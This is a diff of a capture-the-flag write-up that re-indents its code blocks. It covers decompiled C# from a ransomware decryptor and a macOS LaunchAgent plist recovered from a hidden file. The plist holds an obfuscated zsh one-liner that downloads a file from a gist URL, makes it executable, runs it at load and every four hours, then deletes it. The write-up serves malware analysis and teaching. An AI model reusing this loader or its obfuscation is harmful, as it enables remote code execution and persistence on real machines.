@@ -1092,62 +1092,47 @@ flag{dbfe5f755a898ce5f2088b0892850bf7}
 I opened this one in `dnSpy v6.1.8 32-bit` to take a look at the source code. The program asks for a 64-bit key, and validates it, then calls `DecryptFiles(dir, key)`:
 
 ```c#
-private void button1_Click(object sender, EventArgs e)
-		{
-			try
-			{
-				string directoryPath = this.fullPathToVictimFiles.Text.ToString().Trim();
-				string text = this.keyInputTextBox.Text.ToString().Trim().ToLower();
-				if (text == "")
-				{
-					MessageBox.Show("No key provided!");
-				}
-				else if (text.Length < 64)
-				{
-					MessageBox.Show("Key must be 64 chars");
-				}
-				else
-				{
-					MessageBox.Show("Running decryption routine...");
-					DecryptorUtil.DecryptFiles(directoryPath, text);
-					MessageBox.Show("Files decrypted!");
-				}
-			}
-			catch (Exception ex)
-			{
-				MessageBox.Show("Error: " + ex.Message);
-			}
-		}
+private void button1_Click(object sender, EventArgs e) {
+  try {
+    string directoryPath = this.fullPathToVictimFiles.Text.ToString().Trim();
+    string text = this.keyInputTextBox.Text.ToString().Trim().ToLower();
+    if (text == "") {
+      MessageBox.Show("No key provided!");
+    } else if (text.Length < 64) {
+      MessageBox.Show("Key must be 64 chars");
+    } else {
+      MessageBox.Show("Running decryption routine...");
+      DecryptorUtil.DecryptFiles(directoryPath, text);
+      MessageBox.Show("Files decrypted!");
+    }
+  } catch (Exception ex) {
+    MessageBox.Show("Error: " + ex.Message);
+  }
+}
 ```
 
 The file decryption routine is as follows:
 
 ```c#
-public static void DecryptFiles(string directoryPath, string decryptionKey)
-		{
-			string[] files = Directory.GetFiles(directoryPath, "*.encry");
-			if (files.Length == 0)
-			{
-				return;
-			}
-			string text = null;
-			foreach (string text2 in files)
-			{
-				string key;
-				if (text == null)
-				{
-					key = decryptionKey;
-				}
-				else
-				{
-					key = DecryptorUtil.CalculateSHA256Hash(text);
-				}
-				string text3 = Path.Combine(directoryPath, Path.GetFileNameWithoutExtension(text2) + ".decry");
-				DecryptorUtil.AESDecryptFile(text2, text3, key, DecryptorUtil.hardcodedIV);
-				text = text3;
-			}
-			Console.WriteLine("[*] Decryption completed.");
-		}
+public static void DecryptFiles(string directoryPath, string decryptionKey) {
+  string[] files = Directory.GetFiles(directoryPath, "*.encry");
+  if (files.Length == 0) {
+    return;
+  }
+  string text = null;
+  foreach(string text2 in files) {
+    string key;
+    if (text == null) {
+      key = decryptionKey;
+    } else {
+      key = DecryptorUtil.CalculateSHA256Hash(text);
+    }
+    string text3 = Path.Combine(directoryPath, Path.GetFileNameWithoutExtension(text2) + ".decry");
+    DecryptorUtil.AESDecryptFile(text2, text3, key, DecryptorUtil.hardcodedIV);
+    text = text3;
+  }
+  Console.WriteLine("[*] Decryption completed.");
+}
 ```
 
 Breaking it down, the function `DecryptFiles` performs the following:
@@ -1177,21 +1162,18 @@ aes.Padding = PaddingMode.Zeros;
 This indicates that the encryption algorithm is `AES-CFB`, is using a hardcoded IV which is the same for all files, and is zero-padded. The `GenerateAesKeyFromPassword` function is as follows:
 
 ```c#
-private static byte[] GenerateAesKeyFromPassword(string password)
-		{
-			byte[] bytes = Encoding.UTF8.GetBytes("KnownSaltValue");
-			byte[] result;
-			using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes, 10000, HashAlgorithmName.SHA256))
-			{
-				byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
-				if (bytes2.Length != 32)
-				{
-					throw new InvalidOperationException("Derived key size is not valid for AES encryption.");
-				}
-				result = bytes2;
-			}
-			return result;
-		}
+private static byte[] GenerateAesKeyFromPassword(string password) {
+  byte[] bytes = Encoding.UTF8.GetBytes("KnownSaltValue");
+  byte[] result;
+  using(Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes, 10000, HashAlgorithmName.SHA256)) {
+    byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
+    if (bytes2.Length != 32) {
+      throw new InvalidOperationException("Derived key size is not valid for AES encryption.");
+    }
+    result = bytes2;
+  }
+  return result;
+}
 ```
 
 This indicates the key is derived by the `PBKDF2-SHA256` algorithm with a known salt value of `KnownSaltValue`, using 10,000 rounds.
@@ -1199,18 +1181,15 @@ This indicates the key is derived by the `PBKDF2-SHA256` algorithm with a known 
 But what about `CalculateSHA256Hash`? Remember, for every file except for the first, this function is run with the previous filename as a parameter. The code is as follows:
 
 ```c#
-private static string CalculateSHA256Hash(string filePath)
-		{
-			string result;
-			using (SHA256 sha = SHA256.Create())
-			{
-				using (FileStream fileStream = File.OpenRead(filePath))
-				{
-					result = BitConverter.ToString(sha.ComputeHash(fileStream)).Replace("-", "").ToLower();
-				}
-			}
-			return result;
-		}
+private static string CalculateSHA256Hash(string filePath) {
+  string result;
+  using(SHA256 sha = SHA256.Create()) {
+    using(FileStream fileStream = File.OpenRead(filePath)) {
+      result = BitConverter.ToString(sha.ComputeHash(fileStream)).Replace("-", "").ToLower();
+    }
+  }
+  return result;
+}
 ```
 
 This code opens the file, reads and hashes its contents using `SHA-256`, removes any `-` character and converts to lowercase, and returns this.
@@ -1352,20 +1331,20 @@ This was a MacOS app directory. There was a hidden Mach-O file inside, which con
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-	<dict>
-		<key>Label</key>
-		<string>com.huntress.ctf</string>
-		<key>ProgramArguments</key>
-		<array>
-			<string>/bin/zsh</string>
-			<string>-c</string>
-			<string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
-		</array>
-		<key>RunAtLoad</key>
-		<true />
-		<key>StartInterval</key>
-		<integer>14400</integer>
-	</dict>
+  <dict>
+    <key>Label</key>
+    <string>com.huntress.ctf</string>
+    <key>ProgramArguments</key>
+    <array>
+      <string>/bin/zsh</string>
+      <string>-c</string>
+      <string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true />
+    <key>StartInterval</key>
+    <integer>14400</integer>
+  </dict>
 </plist>
 ```
 
